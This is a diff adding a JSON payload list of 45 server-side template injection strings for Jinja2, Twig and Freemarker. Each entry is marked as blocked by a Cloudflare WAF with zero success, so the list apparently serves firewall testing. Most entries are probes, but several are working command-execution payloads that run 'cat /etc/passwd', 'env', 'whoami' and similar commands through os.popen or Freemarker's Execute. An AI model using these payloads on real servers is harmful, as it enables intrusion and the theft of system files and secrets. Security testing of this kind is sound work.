@@ -1,0 +1,637 @@
+{
+  "category": "ssti",
+  "subcategory": "comprehensive",
+  "count": 45,
+  "payloads": [
+    {
+      "id": "ssti-5000",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[0]}}",
+      "description": "Jinja2 SSTI 0",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5001",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[1]}}",
+      "description": "Jinja2 SSTI 1",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5002",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[2]}}",
+      "description": "Jinja2 SSTI 2",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5003",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[3]}}",
+      "description": "Jinja2 SSTI 3",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5004",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[4]}}",
+      "description": "Jinja2 SSTI 4",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5005",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[5]}}",
+      "description": "Jinja2 SSTI 5",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5006",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[6]}}",
+      "description": "Jinja2 SSTI 6",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5007",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[7]}}",
+      "description": "Jinja2 SSTI 7",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5008",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[8]}}",
+      "description": "Jinja2 SSTI 8",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5009",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{config.items()[9]}}",
+      "description": "Jinja2 SSTI 9",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5010",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[0]}}",
+      "description": "Jinja2 SSTI 10",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5011",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[1]}}",
+      "description": "Jinja2 SSTI 11",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5012",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[2]}}",
+      "description": "Jinja2 SSTI 12",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5013",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[3]}}",
+      "description": "Jinja2 SSTI 13",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5014",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[4]}}",
+      "description": "Jinja2 SSTI 14",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5015",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[5]}}",
+      "description": "Jinja2 SSTI 15",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5016",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[6]}}",
+      "description": "Jinja2 SSTI 16",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5017",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[7]}}",
+      "description": "Jinja2 SSTI 17",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5018",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[8]}}",
+      "description": "Jinja2 SSTI 18",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5019",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{''.__class__.__mro__[9]}}",
+      "description": "Jinja2 SSTI 19",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5020",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
+      "description": "Jinja2 SSTI 20",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5021",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('pwd').read()}}",
+      "description": "Jinja2 SSTI 21",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5022",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
+      "description": "Jinja2 SSTI 22",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5023",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "description": "Jinja2 SSTI 23",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5024",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('uname').read()}}",
+      "description": "Jinja2 SSTI 24",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5025",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}",
+      "description": "Jinja2 SSTI 25",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5026",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('ps aux').read()}}",
+      "description": "Jinja2 SSTI 26",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5027",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('netstat').read()}}",
+      "description": "Jinja2 SSTI 27",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5028",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('ifconfig').read()}}",
+      "description": "Jinja2 SSTI 28",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5029",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('env').read()}}",
+      "description": "Jinja2 SSTI 29",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5030",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('0')}}",
+      "description": "Twig SSTI 0",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5031",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('1')}}",
+      "description": "Twig SSTI 1",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5032",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('2')}}",
+      "description": "Twig SSTI 2",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5033",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('3')}}",
+      "description": "Twig SSTI 3",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5034",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('4')}}",
+      "description": "Twig SSTI 4",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5035",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('5')}}",
+      "description": "Twig SSTI 5",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5036",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('6')}}",
+      "description": "Twig SSTI 6",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5037",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('7')}}",
+      "description": "Twig SSTI 7",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5038",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('8')}}",
+      "description": "Twig SSTI 8",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5039",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "{{_self.env.getFilter('9')}}",
+      "description": "Twig SSTI 9",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5040",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('ls')}",
+      "description": "Freemarker SSTI 0",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5041",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('pwd')}",
+      "description": "Freemarker SSTI 1",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5042",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
+      "description": "Freemarker SSTI 2",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5043",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+      "description": "Freemarker SSTI 3",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssti-5044",
+      "category": "ssti",
+      "subcategory": "comprehensive",
+      "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
+      "description": "Freemarker SSTI 4",
+      "technique": "ssti",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
